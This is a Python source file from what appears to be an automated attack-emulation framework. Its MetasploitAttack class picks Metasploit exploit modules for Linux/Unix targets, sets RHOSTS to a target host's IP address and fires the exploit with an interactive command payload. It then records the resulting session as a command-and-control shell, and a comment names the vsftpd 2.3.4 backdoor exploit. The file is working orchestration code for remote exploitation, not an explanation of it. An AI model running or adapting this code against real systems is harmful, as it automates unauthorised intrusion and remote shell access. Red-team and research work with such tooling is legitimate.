from __future__ import annotations
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from Operations import Client, Operation
    from Operations.MetasploitShell import MetasploitC2, MetasploitShell
from Attacks.InitialAccessAttack import InitialAccessAttack
from Data.Techniques import Database
from Data.Techniques.ServiceData import ServiceData
from Data.Techniques.ClientData import ClientData
import re
import uuid
import xml.etree.ElementTree as ET
from Data.Techniques.ClientsData import ClientsData
from pymetasploit3.msfrpc import *
import time

# This is intended to be run on the starting malicious attacker client

class MetasploitAttack(InitialAccessAttack):
    # Todo: parse out and store the version

    def __init__(self, exploitModule: ExploitModule, metasploitServer: MetasploitC2):
        self.exploitModule = exploitModule
        self.metasploitServer = metasploitServer

    def onlyRequiresRHOSTS(self):
        missingRequirements = self.exploitModule.missing_required
        if(len(missingRequirements) == 1 and missingRequirements[0] == 'RHOSTS'):
            return True
        return False
    
    # Maybe it should check per client
    # Todo: make this support more than just linux
    def meetsPrereqs(self, clientData: ClientData):
        isForLinux = "linux" in self.exploitModule.info['fullname']
        isForUnix = "unix" in self.exploitModule.info['fullname']
        if(not(isForLinux) and not(isForUnix)):
            return False

        metasploitName: str = self.exploitModule.info['fullname']

        hasMetasploitService: bool = clientData.servicesData.hasServiceNameInMetasploitName(metasploitName)
        return hasMetasploitService
        # for client in clientsWithService:
        #     client.executeAttack(...)

    async def execute(self, targetHost: ClientData, metasploitServer: MetasploitC2, operation: Operation):
        # Known bug/limitation here: Metasploit Exploit Overlap Bug
        # Todo: Data will have to be passed in smartly
        # This breaks because it tries to run payload and assumes it's a module
        # Todo: make work for multiple OSes by dynamically chaning payload
        # Todo: Change determining if attack was successful or not

        # This is erroring out with Invalid Authentication Token
        #client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
        refreshed = metasploitServer.metasploitServer.modules.use('exploit', self.exploitModule.info['fullname'])
        refreshed['RHOSTS'] = targetHost.ipAddress
        output = refreshed.execute(payload='cmd/unix/interact')
        time.sleep(5)
        #output = self.exploitModule.execute(payloads='cmd/unix/interact')
        #output = self.exploitModule.execute()
        try:
            metasploitShell = metasploitServer.getLatestSession(targetHost.ipAddress)
            targetHost.c2Shells.append(metasploitShell)
        except Exception:
            pass
        return